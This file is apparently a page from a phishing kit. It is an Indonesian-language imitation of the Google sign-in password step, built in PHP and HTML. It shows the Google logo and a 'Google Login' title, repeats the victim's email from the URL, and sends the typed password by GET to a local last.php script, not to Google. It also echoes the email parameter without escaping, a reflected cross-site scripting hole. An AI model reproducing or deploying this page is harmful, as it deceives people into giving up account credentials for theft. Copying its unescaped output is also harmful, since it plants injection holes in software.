<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="box">
        <form action="./last.php" class="form" method="get">
            <br>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1280px-Google_2015_logo.svg.png" alt="" width="75">
            <br>
            <h1 class="form-title">Selamat Datang</h1>
            <center>
                <br>
                <div class="authname">
                    <a href="./index.php" class="authuser">

                        <img src="./Capture3.PNG" width="20" height="20" srcset="">
                    </a>
                    <a href="" class="emailuser">
                        <?= $_GET['email']; ?>

                    </a>
                </div>
            </center>
            <br>
            <div class="form-group">
                <input type="password" class="form-control" name="password" id="password" required>
                <label for="" class="form-label">Password</label>
            </div>
            <div class=" ">
                <input type="checkbox" name="checkbox" id="checkbox" onclick="pass()" />
                <label for="checkbox">Tampilkan sandi</label>
            </div>
            <br>
            <br>



            <div class="bottom-box">
                <a href="#" class="bold">Lupa sandi ?</a>
                <button class="form-button"> Selanjutnya</button>
            </div>

        </form>
    </div>
    <script>
        function pass() {
            var x = document.getElementById("password");
            if (x.type === "password") {
                x.type = "text";
            } else {
                x.type = "password";
            }
        }
    </script>
</body>

</html>